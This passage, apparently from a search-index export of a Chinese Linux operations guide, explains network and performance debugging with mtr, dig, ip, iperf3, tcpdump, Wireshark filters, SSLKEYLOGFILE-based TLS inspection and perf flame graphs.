Debian-2+deb12u5\n</code></pre>"},{"location":"ops/debug/#mtr","title":"mtr","text":"<p>\u200b\u5bf9\u4e8e\u200b\u7279\u5b9a\u200b\u7684\u200b\u4e3b\u673a\u200b\u65e0\u6cd5\u200b\u8fde\u63a5\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u4f1a\u200b\u5e0c\u671b\u200b\u77e5\u9053\u200b\u81ea\u5df1\u200b\u7684\u200b\u5305\u200b\u5728\u200b\u54ea\u200b\u4e00\u200b\u8df3\u200b\u4e22\u5931\u200b\u4e86\u200b\u3002<code>mtr</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u662f\u200b <code>ping</code> \u200b\u548c\u200b <code>traceroute</code> \u200b\u7684\u200b\u7ed3\u5408\u4f53\u200b\uff0c\u200b\u65e2\u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u6bcf\u4e00\u200b\u8df3\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u4e22\u200b\u5305\u7387\u200b\u3002</p> <p>mtr-tiny</p> <p>Debian \u200b\u4e0b\u200b\u7684\u200b <code>mtr</code> \u200b\u5305\u4f1a\u200b\u5305\u542b\u200b\u56fe\u5f62\u754c\u9762\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u5efa\u8bae\u200b\u5b89\u88c5\u200b <code>mtr-tiny</code> \u200b\u5305\u200b\u3002</p> <p>\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b <code>mtr &lt;\u200b\u5730\u5740\u200b&gt;</code> \u200b\u5373\u53ef\u200b\u8fdb\u5165\u200b\u4ea4\u4e92\u5f0f\u200b\u754c\u9762\u200b\u67e5\u770b\u200b\u6bcf\u4e00\u200b\u8df3\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5206\u4eab\u200b\u7ed9\u200b\u5176\u4ed6\u4eba\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b <code>--report</code>\uff08<code>-r</code>\uff09\u200b\u53c2\u6570\u200b\u8fdb\u5165\u200b\u975e\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\u62a5\u544a\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>-c</code> \u200b\u8bbe\u7f6e\u200b\u8f6e\u6570\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>mtr -c 10 -r www.example.com\n</code></pre> <p><code>mtr</code> \u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b ICMP Echo \u200b\u5305\u200b\u6267\u884c\u200b trace \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>--tcp</code> \u200b\u548c\u200b <code>--udp</code> \u200b\u53c2\u6570\u200b\u5207\u6362\u200b\u4e3a\u200b TCP \u200b\u6216\u200b UDP \u200b\u5305\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4f7f\u7528\u200b <code>--port</code> \u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u8bbf\u95ee\u200b\u7684\u200b TCP/UDP \u200b\u7aef\u53e3\u53f7\u200b\u3002</p>"},{"location":"ops/debug/#dig","title":"dig \u200b\u4e0e\u200b DNS","text":"<p>\u200b\u5982\u679c\u200b\u5728\u200b\u8fdb\u884c\u200b\u7f51\u7edc\u200b\u64cd\u4f5c\u200b\u65f6\u200b\u770b\u5230\u200b\u7c7b\u4f3c\u200b\u4e0b\u9762\u200b\u7684\u200b\u9519\u8bef\u200b\uff1a</p> <pre><code>$ curl -I www.example.com\ncurl: (6) Could not resolve host: www.example.com\n</code></pre> <p>\u200b\u90a3\u4e48\u200b\u5c31\u200b\u9700\u8981\u200b\u6392\u67e5\u200b DNS \u200b\u7684\u200b\u95ee\u9898\u200b\u3002<code>dig</code> \u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u6d4b\u8bd5\u200b\u5411\u200b\u6307\u5b9a\u200b DNS \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u89e3\u6790\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u4f8b\u5b50\u200b\u5305\u542b\u200b\uff1a</p> <ul> <li><code>dig www.example.com</code>\uff1a\u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u200b\u9ed8\u8ba4\u200b\u7684\u200b DNS \u200b\u670d\u52a1\u5668\u200b\u89e3\u6790\u200b A \u200b\u8bb0\u5f55\u200b</li> <li><code>dig www.example.com @8.8.8.8</code>\uff1a\u200b\u4f7f\u7528\u200b Google \u200b\u7684\u200b DNS \u200b\u670d\u52a1\u5668\u200b\u89e3\u6790\u200b A \u200b\u8bb0\u5f55\u200b</li> <li><code>dig www.example.com AAAA</code>\uff1a\u200b\u89e3\u6790\u200b AAAA\uff08IPv6\uff09\u200b\u8bb0\u5f55\u200b</li> <li><code>dig www.example.com +short</code>\uff1a\u200b\u76f4\u63a5\u200b\u8f93\u51fa\u200b\u89e3\u6790\u200b\u7ed3\u679c\u200b\uff0c\u200b\u4e0d\u200b\u663e\u793a\u200b\u5176\u4ed6\u200b\u5185\u5bb9\u200b</li> </ul> <p>\u200b\u8fd9\u91cc\u200b\u7cfb\u7edf\u200b\u9ed8\u8ba4\u200b\u7684\u200b DNS \u200b\u670d\u52a1\u5668\u200b\u6307\u200b <code>/etc/resolv.conf</code> \u200b\u4e2d\u200b\u7684\u200b\u914d\u7f6e\u200b\u7684\u200b <code>nameserver</code>\uff0c\u200b\u5728\u200b\u4e00\u90e8\u5206\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c<code>nameserver</code> \u200b\u4f1a\u200b\u662f\u200b 127.0.0.53\uff0c\u200b\u4ee3\u8868\u200b\u5176\u200b\u542f\u7528\u200b\u4e86\u200b <code>systemd-resolved</code> \u200b\u4f5c\u4e3a\u200b\u672c\u5730\u200b\u7684\u200b DNS \u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>resolvectl</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u5b9e\u9645\u200b\u7684\u200b DNS \u200b\u914d\u7f6e\u200b\u3002</p> <p>C \u200b\u8fd0\u884c\u200b\u65f6\u5e93\u200b\u4e0e\u200b DNS \u200b\u89e3\u6790\u200b</p> <p>\u200b\u8bb8\u591a\u200b\u7a0b\u5e8f\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u200b C \u200b\u8fd0\u884c\u200b\u65f6\u5e93\u200b\u7684\u200b <code>getaddrinfo()</code> \u200b\u7b49\u200b\u51fd\u6570\u200b\u83b7\u53d6\u200b DNS \u200b\u89e3\u6790\u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u4f46\u662f\u200b <code>dig</code> \u200b\u4e0d\u4f1a\u200b\u3002\u200b\u8fd9\u200b\u53ef\u80fd\u200b\u5bfc\u81f4\u200b <code>dig</code> \u200b\u8fd0\u884c\u200b\u65e0\u8bef\u200b\uff0c\u200b\u4f46\u662f\u200b\u4f7f\u7528\u200b C \u200b\u8fd0\u884c\u200b\u65f6\u5e93\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u56e0\u4e3a\u200b\u5176\u4ed6\u200b\u539f\u56e0\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u89e3\u6790\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>getent hosts www.example.com</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u6d4b\u8bd5\u200b C \u200b\u8fd0\u884c\u200b\u65f6\u5e93\u200b\u7684\u200b DNS \u200b\u89e3\u6790\u200b\u60c5\u51b5\u200b\u3002</p>"},{"location":"ops/debug/#ip","title":"ip","text":"<p><code>ip</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u672c\u673a\u200b\u7684\u200b\u7f51\u7edc\u63a5\u53e3\u200b\u7b49\u200b\u72b6\u6001\u200b\u3002<code>ip a</code>\uff08<code>ip address</code>\uff09\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u6240\u6709\u200b\u63a5\u53e3\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5305\u62ec\u200b IP \u200b\u5730\u5740\u200b\u3001\u200b\u662f\u5426\u200b\u4e0a\u7ebf\u200b\u7b49\u200b\uff1a</p> <pre><code>$ ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute\n       valid_lft forever preferred_lft forever\n2: eth0@if637: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000\n    link/ether be:ed:ab:c0:e6:cf brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.31.155.84/16 brd 172.31.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 2001:da8:d800:4bfc:bced:abff:fec0:e6cf/64 scope global dynamic mngtmpaddr noprefixroute\n       valid_lft 86400sec preferred_lft 14400sec\n    inet6 fe80::bced:abff:fec0:e6cf/64 scope link\n       valid_lft forever preferred_lft forever\n</code></pre> <p>\u200b\u4e00\u822c\u200b\u6709\u7ebf\u200b\u7f51\u7edc\u200b\u90fd\u200b\u4ee5\u200b <code>eth</code> \u200b\u6216\u8005\u200b <code>enp</code> \u200b\u5f00\u5934\u200b\uff0c\u200b\u65e0\u7ebf\u7f51\u7edc\u200b\u4ee5\u200b <code>wlp</code> \u200b\u5f00\u5934\u200b\u3002\u200b\u5982\u679c\u200b <code>state</code> \u200b\u662f\u200b <code>DOWN</code>\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u68c0\u67e5\u4e00\u4e0b\u200b\u7269\u7406\u200b\u7f51\u7edc\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7f51\u7ebf\u200b\u662f\u5426\u200b\u6709\u200b\u63d2\u200b\u597d\u200b\u7b49\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f51\u7edc\u63a5\u53e3\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>ip r</code>\uff08<code>ip route</code>\uff09\u200b\u547d\u4ee4\u200b\u7ba1\u7406\u200b\u8def\u7531\u8868\u200b\u3002\u200b\u4f7f\u7528\u200b <code>ip r g &lt;ip&gt;</code>\uff08<code>ip route get</code>\uff09\u200b\u53ef\u4ee5\u200b\u786e\u8ba4\u200b\u53d1\u9001\u5230\u200b\u67d0\u4e2a\u200b IP \u200b\u5730\u5740\u200b\u7684\u200b\u7f51\u7edc\u200b\u5305\u4f1a\u200b\u7ecf\u8fc7\u200b\u54ea\u4e2a\u200b\u7f51\u7edc\u63a5\u53e3\u200b\uff1a</p> <pre><code>$ ip r g 8.8.8.8\n8.8.8.8 via 172.31.0.1 dev eth0 src 172.31.155.84 uid 1000\n    cache\n</code></pre>"},{"location":"ops/debug/#performance-check","title":"\u6027\u80fd\u200b\u68c0\u67e5","text":"<p>iperf \u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u6d4b\u8bd5\u200b\u4e24\u53f0\u200b\u4e3b\u673a\u200b\u4e4b\u95f4\u200b\u7684\u200b\u7f51\u7edc\u200b\u6027\u80fd\u200b\u3002\u200b\u76ee\u524d\u200b iperf \u200b\u6709\u200b\u4e24\u4e2a\u200b\u7248\u672c\u200b\uff1aiperf2 \u200b\u548c\u200b iperf3\uff0c\u200b\u4e24\u8005\u200b\u4e92\u4e0d\u200b\u517c\u5bb9\u200b\u3002\u200b\u5173\u4e8e\u200b\u4e24\u8005\u200b\u529f\u80fd\u200b\u7684\u200b\u6bd4\u8f83\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>Throughput Tool Comparision</li> <li>Iperf 2 &amp; Iperf 3 Comparison Table</li> </ul> <p>\u200b\u5c3d\u7ba1\u200b\u5b58\u5728\u200b\u529f\u80fd\u200b\u5dee\u5f02\u200b\uff0c\u200b\u4e24\u8005\u200b\u6700\u200b\u57fa\u7840\u200b\u7684\u200b\u529f\u80fd\u200b\u662f\u200b\u76f8\u4f3c\u200b\u7684\u200b\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u5148\u200b\u5728\u200b\u4e00\u53f0\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u8fd0\u884c\u200b iperf server\uff0c\u200b\u518d\u200b\u5728\u200b\u53e6\u4e00\u53f0\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u8fd0\u884c\u200b iperf client \u200b\u8fdb\u884c\u200b\u6d4b\u8bd5\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0ciperf \u200b\u6d4b\u8bd5\u200b\u7684\u200b\u662f\u4ece\u200b client \u200b\u4e0a\u200b\u4f20\u5230\u200b server \u200b\u7684\u200b\u901f\u5ea6\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>-R</code> \u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u6d4b\u8bd5\u200b\u4ece\u200b server \u200b\u4e0b\u8f7d\u200b\u5230\u200b client \u200b\u7684\u200b\u901f\u5ea6\u200b\u3002\u200b\u4ee5\u200b iperf3 \u200b\u4e3a\u4f8b\u200b\uff1a</p> <ul> <li> <p>server \u200b\u7aef\u200b\uff1a</p> <pre><code>$ iperf3 -s\n-----------------------------------------------------------\nServer listening on 5201 (test #1)\n-----------------------------------------------------------\n</code></pre> </li> <li> <p>client \u200b\u7aef\u200b\uff1a</p> <pre><code>$ iperf3 -c 192.168.122.1\nConnecting to host 192.168.122.1, port 5201\n[  5] local 192.168.122.247 port 42522 connected to 192.168.122.1 port 5201\n[ ID] Interval           Transfer     Bitrate         Retr  Cwnd\n[  5]   0.00-1.00   sec  5.60 GBytes  48.1 Gbits/sec    0   2.12 MBytes       \n[  5]   1.00-2.00   sec  5.95 GBytes  51.1 Gbits/sec    0   2.72 MBytes       \n[  5]   2.00-3.00   sec  4.96 GBytes  42.6 Gbits/sec    0   2.72 MBytes       \n[  5]   3.00-4.00   sec  5.37 GBytes  46.1 Gbits/sec    0   2.72 MBytes       \n[  5]   4.00-5.00   sec  5.74 GBytes  49.3 Gbits/sec    0   2.72 MBytes       \n[  5]   5.00-6.00   sec  5.55 GBytes  47.7 Gbits/sec    0   2.72 MBytes       \n[  5]   6.00-7.00   sec  5.72 GBytes  49.1 Gbits/sec    0   2.72 MBytes       \n[  5]   7.00-8.00   sec  5.65 GBytes  48.6 Gbits/sec    0   2.72 MBytes       \n[  5]   8.00-9.00   sec  5.72 GBytes  49.1 Gbits/sec    0   2.87 MBytes       \n[  5]   9.00-10.00  sec  5.25 GBytes  45.1 Gbits/sec    0   3.02 MBytes       \n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  55.5 GBytes  47.7 Gbits/sec    0             sender\n[  5]   0.00-10.00  sec  55.5 GBytes  47.7 Gbits/sec                  receiver\n\niperf Done.\n</code></pre> <p>\u200b\u540c\u65f6\u200b server \u200b\u7aef\u200b\u4e5f\u200b\u4f1a\u200b\u663e\u793a\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u8f93\u51fa\u200b\u3002</p> </li> </ul>"},{"location":"ops/debug/#network-packet-capture","title":"\u7f51\u7edc\u200b\u6293\u5305","text":"<p><code>tcpdump</code> \u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u6293\u200b\u5305\u200b\uff0c\u200b\u57fa\u7840\u200b\u7684\u200b\u547d\u4ee4\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code># \u200b\u5728\u200b eth0 \u200b\u4e0a\u200b\u6293\u53d6\u200b\u6240\u6709\u200b\u5305\u200b\uff0c\u200b\u8f93\u51fa\u200b\u5230\u200b\u7ec8\u7aef\u200b\ntcpdump -ni eth0\n# \u200b\u8f93\u51fa\u200b\u5230\u200b result.pcap \u200b\u6587\u4ef6\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u8fdb\u4e00\u6b65\u200b\u5206\u6790\u200b\ntcpdump -ni eth0 -w result.pcap\n# \u200b\u6293\u53d6\u200b\u6240\u6709\u200b\u4ece\u200b 8.8.8.8 \u200b\u53d1\u9001\u200b\u6216\u200b\u63a5\u6536\u200b\u7684\u200b\u5305\u200b\ntcpdump -ni eth0 host 8.8.8.8\n</code></pre> <p><code>-n</code> \u200b\u53c2\u6570\u200b\u7528\u4e8e\u200b\u8ba9\u200b tcpdump \u200b\u4e0d\u8981\u200b\u53bb\u200b\u89e3\u6790\u200b\u4e3b\u673a\u540d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u89e3\u6790\u200b\u4e3b\u673a\u540d\u200b\u9700\u8981\u200b\u53d1\u9001\u200b\u989d\u5916\u200b\u7684\u200b DNS \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8fd9\u200b\u5728\u200b\u5f88\u591a\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u90fd\u200b\u662f\u975e\u200b\u9884\u671f\u200b\u7684\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4f1a\u200b\u5f71\u54cd\u200b\u6293\u5305\u200b\u6027\u80fd\u200b\u3002\u200b\u4f8b\u5b50\u200b\u91cc\u9762\u200b\u7684\u200b <code>host 8.8.8.8</code> \u200b\u90e8\u5206\u200b\u4e3a\u200b pcap \u200b\u8868\u8fbe\u5f0f\u200b\uff0c\u200b\u8be6\u60c5\u200b\u53ef\u200b\u9605\u8bfb\u200b pcap-filter(7)\u3002</p> <p>\u200b\u7f16\u5199\u200b pcap \u200b\u8868\u8fbe\u5f0f\u200b</p> <p>\u200b\u5c1d\u8bd5\u200b\u7f16\u5199\u200b\u6ee1\u8db3\u200b\u4ee5\u4e0b\u200b\u8981\u6c42\u200b\u7684\u200b\u8868\u8fbe\u5f0f\u200b\uff0c\u200b\u5e76\u7528\u200b <code>tcpdump</code> \u200b\u6d4b\u8bd5\u200b\uff1a</p> <ul> <li>\u200b\u7cfb\u7edf\u200b\u53d1\u9001\u200b\u548c\u200b\u63a5\u6536\u200b\u7684\u200b\u6240\u6709\u200b DNS\uff08TCP &amp; UDP 53\uff09\u200b\u534f\u8bae\u200b\u5305\u200b<ul> <li>\u200b\u5982\u679c\u200b\u53ea\u200b\u9700\u8981\u200b UDP \u200b\u7684\u200b\u5305\u200b\u5462\u200b\uff1f</li> </ul> </li> <li>\u200b\u7cfb\u7edf\u200b\u53d1\u9001\u5230\u200b www.example.com\uff08\u200b\u6216\u200b\u5176\u4ed6\u200b\u7f51\u7ad9\u200b\u7684\u200b\uff09\u200b\u7684\u200b HTTP \u200b\u5305\u200b</li> <li>\u200b\u7cfb\u7edf\u200b\u53d1\u9001\u5230\u200b 80 \u200b\u6216\u200b 443 \u200b\u63a5\u53e3\u200b\u7684\u200b\u6240\u6709\u200b\u7684\u200b\u5305\u200b</li> </ul> <p>\u200b\u5f97\u5230\u200b\u7684\u200b pcap \u200b\u6587\u4ef6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Wireshark\uff08GUI\uff09\u200b\u6216\u200b tshark\uff08TUI\uff09\u200b\u6253\u5f00\u200b\u5206\u6790\u200b\u3002Wireshark \u200b\u8fc7\u6ee4\u200b\u8868\u8fbe\u5f0f\u200b\u7684\u200b\u8bed\u6cd5\u200b\u4e0e\u200b pcap filter \u200b\u6709\u6240\u4e0d\u540c\u200b\u3002\u200b\u975e\u5e38\u200b\u5e38\u89c1\u200b\u7684\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li><code>ip.addr == 8.8.8.8</code>\uff1a\u200b\u8fc7\u6ee4\u200b IP \u200b\u4e3a\u200b 8.8.8.8 \u200b\u7684\u200b\u6240\u6709\u200b\u5305\u200b</li> <li><code>http</code>\uff1a\u200b\u8fc7\u6ee4\u200b HTTP \u200b\u534f\u8bae\u200b</li> <li><code>tcp.port = 1234</code>\uff1a\u200b\u8fc7\u6ee4\u200b TCP \u200b\u7aef\u53e3\u200b\u4e3a\u200b 1234 \u200b\u7684\u200b\u6240\u6709\u200b\u5305\u200b</li> </ul> <p>\u200b\u7f16\u5199\u200b Wireshark \u200b\u8868\u8fbe\u5f0f\u200b</p> <p>\u200b\u8bf7\u200b\u5728\u200b Wireshark \u200b\u4e2d\u200b\u7f16\u5199\u200b\u6ee1\u8db3\u200b\u548c\u200b\u4e0a\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\u76f8\u540c\u200b\u7684\u200b\u8fc7\u6ee4\u200b\u8868\u8fbe\u5f0f\u200b\uff0c\u200b\u5e76\u200b\u6d4b\u8bd5\u200b\u3002</p> <p>TLS \u200b\u6293\u5305\u200b</p> <p>TLS\uff08\u200b\u5982\u200b HTTPS \u200b\u7b49\u200b\uff09\u200b\u662f\u200b\u52a0\u5bc6\u200b\u7684\u200b\uff0c\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u6293\u5305\u200b\u53ea\u200b\u80fd\u591f\u200b\u770b\u5230\u200b\u8fde\u63a5\u200b\u53cc\u65b9\u200b\u4e4b\u95f4\u200b\u53d1\u9001\u200b\u4e86\u200b\u4e00\u4e9b\u200b TLS \u200b\u6570\u636e\u5305\u200b\uff08\u200b\u5982\u679c\u200b\u662f\u200b HTTPS\uff0c\u200b\u53ef\u80fd\u200b\u8fd8\u200b\u80fd\u200b\u770b\u5230\u200b\u8bc1\u4e66\u200b\u548c\u200b\u660e\u6587\u200b\u7684\u200b\u76ee\u6807\u200b\u57df\u540d\u200b\uff0c\u200b\u5373\u200b SNI\uff09\uff0c\u200b\u4f46\u662f\u200b\u65e0\u6cd5\u200b\u770b\u5230\u200b\u5177\u4f53\u200b\u7684\u200b\u8bf7\u6c42\u200b\u4e0e\u200b\u54cd\u5e94\u200b\u5185\u5bb9\u200b\u3002\u200b\u4f46\u662f\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u6293\u5305\u200b\u4e86\u89e3\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5206\u6790\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5728\u200b\u542f\u52a8\u200b\u5efa\u7acb\u200b TLS \u200b\u8fde\u63a5\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u65f6\u200b\u6dfb\u52a0\u200b <code>SSLKEYLOGFILE</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\uff1a</p> <pre><code>SSLKEYLOGFILE=test.log curl --http1.1 https://www.example.com\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u5728\u200b wireshark \u200b\u7684\u200b TLS \u200b\u534f\u8bae\u200b\u8bbe\u7f6e\u200b\u4e2d\u200b\u8bbe\u7f6e\u200b (Pre)-Master-Secret log filename \u200b\u5373\u53ef\u200b\uff0c\u200b\u5982\u4e0b\u200b\u56fe\u200b\uff1a</p> <p></p> <p>bcc \u200b\u63d0\u4f9b\u200b\u7684\u200b <code>sslsniff</code> \u200b\u5de5\u5177\u200b\u3001eCapture \u200b\u5de5\u5177\u200b\u5219\u200b\u901a\u8fc7\u200b eBPF \u200b\u7684\u200b\u65b9\u5f0f\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u67e5\u770b\u200b\u52a0\u5bc6\u200b\u5185\u5bb9\u200b\u7684\u200b\u529f\u80fd\u200b\u3002</p> <p>HTTP/HTTPS \u200b\u6293\u5305\u200b\u5de5\u5177\u200b</p> <p>\u200b\u5982\u200b Burp Suite\u3001Fiddler \u200b\u7b49\u200b\u5de5\u5177\u200b\u4e13\u95e8\u200b\u8bbe\u8ba1\u200b\u4e3a\u200b HTTP/HTTPS \u200b\u6293\u5305\u200b\u5de5\u5177\u200b\uff0c\u200b\u4ee5\u200b\u65b9\u4fbf\u200b\u5f00\u53d1\u8005\u200b\u8c03\u8bd5\u200b\u3002\u200b\u5b83\u4eec\u200b\u7684\u200b\u5de5\u4f5c\u200b\u539f\u7406\u200b\u662f\u200b\u5728\u200b\u672c\u673a\u200b\u8fd0\u884c\u200b\u4e00\u4e2a\u200b\u4ee3\u7406\u670d\u52a1\u5668\u200b\uff0c\u200b\u5728\u200b\u8bbe\u7f6e\u200b\u6d4f\u89c8\u5668\u200b\u6216\u200b\u5e94\u7528\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u4ee3\u7406\u670d\u52a1\u5668\u200b\u540e\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u5de5\u5177\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b HTTP \u200b\u8bf7\u6c42\u200b\u4e0e\u200b\u54cd\u5e94\u200b\u5185\u5bb9\u200b\u3002\u200b\u5982\u679c\u200b\u5b89\u88c5\u200b\u5b83\u4eec\u200b\u63d0\u4f9b\u200b\u7684\u200b\u6839\u200b\u8bc1\u4e66\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u89e3\u5bc6\u200b HTTPS \u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"ops/debug/#performance-analysis","title":"\u6027\u80fd\u200b\u95ee\u9898\u200b\u5206\u6790","text":"<p>\u200b\u672c\u200b\u8282\u200b\u4ecb\u7ecd\u200b\u4f7f\u7528\u200b <code>perf</code> \u200b\u7b49\u200b\u5de5\u5177\u200b\u8fdb\u884c\u200b\u57fa\u7840\u200b\u7684\u200b\u6027\u80fd\u200b\u95ee\u9898\u200b\u5206\u6790\u200b\u7684\u200b\u65b9\u5f0f\u200b\u3002<code>perf</code> \u200b\u5de5\u5177\u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b\u968f\u200b Linux \u200b\u5185\u6838\u200b\u5206\u53d1\u200b\uff0c\u200b\u5176\u200b\u4e5f\u200b\u4f9d\u8d56\u4e8e\u200b Linux \u200b\u5185\u6838\u200b\u5934\u6587\u4ef6\u200b\u3002\u200b\u5728\u200b Debian \u200b\u4e0a\u200b\u7684\u200b\u5305\u200b\u540d\u4e3a\u200b <code>linux-perf</code>\u3002</p> <p><code>perf</code> \u200b\u7684\u200b\u529f\u80fd\u200b\u975e\u5e38\u200b\u4e30\u5bcc\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u4ec5\u80fd\u200b\u4ecb\u7ecd\u200b\u4e00\u5c0f\u90e8\u5206\u200b\u529f\u80fd\u200b\u3002</p>"},{"location":"ops/debug/#flamegraph","title":"\u706b\u7130\u200b\u56fe","text":"<p>\u200b\u706b\u7130\u200b\u56fe\u662f\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u7528\u4e8e\u200b\u5206\u6790\u7a0b\u5e8f\u200b\u6027\u80fd\u200b\u7684\u200b\u56fe\u8868\u200b\u4e4b\u4e00\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u76f4\u89c2\u200b\u5730\u200b\u5c55\u793a\u200b\u7a0b\u5e8f\u200b\u4e2d\u200b\u51fd\u6570\u200b\u7684\u200b\u8c03\u7528\u200b\u5173\u7cfb\u200b\u4e0e\u200b\u8017\u65f6\u200b\u3002\u200b\u751f\u6210\u200b\u7684\u200b SVG \u200b\u6587\u4ef6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u6d4f\u89c8\u5668\u200b\u6253\u5f00\u200b\u5e76\u200b\u4ea4\u4e92\u200b\u3002</p> <p></p> <p>\u200b\u706b\u7130\u200b\u56fe\u200b\u793a\u4f8b\u200b\u3002\u200b\u70b9\u51fb\u200b\u56fe\u7247\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u5b8c\u6574\u200b\u7684\u200b SVG \u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u706b\u7130\u200b\u56fe\u200b\u6309\u7167\u200b\u51fd\u6570\u8c03\u7528\u200b\u6808\u200b\u7684\u200b\u65b9\u5f0f\u200b\u7ad6\u5411\u200b\u5c55\u793a\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u6267\u884c\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5e95\u90e8\u200b\u662f\u200b\u8c03\u7528\u200b\u6808\u200b\u7684\u200b\u6700\u200b\u5916\u5c42\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u6761\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u4ee3\u8868\u200b\u5bf9\u5e94\u200b\u7684\u200b\u51fd\u6570\u200b\u6267\u884c\u200b\u7684\u200b CPU 